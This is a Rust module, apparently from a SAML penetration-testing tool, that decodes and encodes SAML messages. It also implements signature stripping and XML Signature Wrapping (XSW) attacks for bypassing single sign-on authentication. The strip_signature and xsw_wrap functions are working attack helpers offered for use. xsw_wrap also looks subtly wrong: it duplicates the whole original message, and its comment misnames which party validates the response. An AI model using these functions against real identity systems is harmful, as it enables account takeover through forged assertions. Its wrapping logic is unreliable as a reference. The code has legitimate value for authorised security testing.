//! SAML Raider — decode + re-encode SAML messages, swap signatures, strip
//! the signature wrapper.
//!
//! SAML messages travel as URL-encoded base64'd (and frequently deflated) XML.

use anyhow::{Context, Result};
use base64::{engine::general_purpose, Engine as _};
use flate2::{read::DeflateDecoder, write::DeflateEncoder, Compression};
use std::io::{Read, Write};

#[derive(Debug, Clone)]
pub struct DecodedSaml {
    pub xml: String,
    pub was_deflated: bool,
}

pub fn decode(samlb64: &str) -> Result<DecodedSaml> {
    let raw = general_purpose::STANDARD
        .decode(samlb64.trim())
        .context("base64")?;
    // Try as deflated first; fall back to raw.
    let mut deflater = DeflateDecoder::new(&raw[..]);
    let mut inflated = String::new();
    if deflater.read_to_string(&mut inflated).is_ok() && inflated.contains('<') {
        return Ok(DecodedSaml { xml: inflated, was_deflated: true });
    }
    let xml = String::from_utf8(raw).context("non-utf8 SAML")?;
    Ok(DecodedSaml { xml, was_deflated: false })
}

pub fn encode(xml: &str, deflate: bool) -> Result<String> {
    if deflate {
        let mut enc = DeflateEncoder::new(Vec::new(), Compression::default());
        enc.write_all(xml.as_bytes())?;
        let bytes = enc.finish()?;
        Ok(general_purpose::STANDARD.encode(bytes))
    } else {
        Ok(general_purpose::STANDARD.encode(xml.as_bytes()))
    }
}

/// Strip the `<Signature>…</Signature>` element from a SAML response. Used to
/// test for missing-signature-verification flaws.
pub fn strip_signature(xml: &str) -> String {
    let mut out = xml.to_string();
    while let (Some(a), Some(b)) = (out.find("<ds:Signature"), out.find("</ds:Signature>")) {
        let end = b + "</ds:Signature>".len();
        if a < end {
            out.replace_range(a..end, "");
        } else {
            break;
        }
    }
    while let (Some(a), Some(b)) = (out.find("<Signature"), out.find("</Signature>")) {
        let end = b + "</Signature>".len();
        if a < end {
            out.replace_range(a..end, "");
        } else {
            break;
        }
    }
    out
}

/// XML Signature Wrapping (XSW): copies the original assertion, wraps the
/// signed copy inside a benign element, leaves a malicious copy at the top
/// for the IdP to validate.
pub fn xsw_wrap(xml: &str, malicious_assertion: &str) -> String {
    let marker = "<saml:Response";
    if let Some(idx) = xml.find(marker) {
        let inject = format!("{malicious_assertion}<Extensions>{xml}</Extensions>");
        let mut s = xml.to_string();
        s.insert_str(idx, &inject);
        s
    } else {
        xml.to_string()
    }
}
